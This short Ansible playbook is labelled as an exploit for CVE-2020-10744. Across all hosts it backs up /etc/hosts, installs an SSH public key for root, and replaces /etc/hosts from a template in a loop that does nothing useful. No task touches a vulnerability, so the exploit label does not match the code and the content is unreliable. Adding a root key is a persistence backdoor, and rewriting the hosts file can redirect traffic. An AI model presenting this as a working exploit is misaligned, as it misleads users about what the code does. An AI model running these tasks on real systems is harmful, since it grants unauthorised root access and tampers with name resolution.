
---
- name: Exploit for CVE-2020-10744
  hosts: all
  gather_facts: no

  tasks:
    - name: Make a backup of hosts file
      copy:
        src: /etc/hosts
        dest: /etc/hosts.backup

    - name: Add a new authorized key
      authorized_key:
        user: root
        key: "{{ lookup('file','/path/to/public/key') }}"
        manage_dir: yes

    - name: Update hosts file
      template:
        src: /etc/hosts.template
        dest: /etc/hosts
      loop: "{{ groups['all'] }}"

  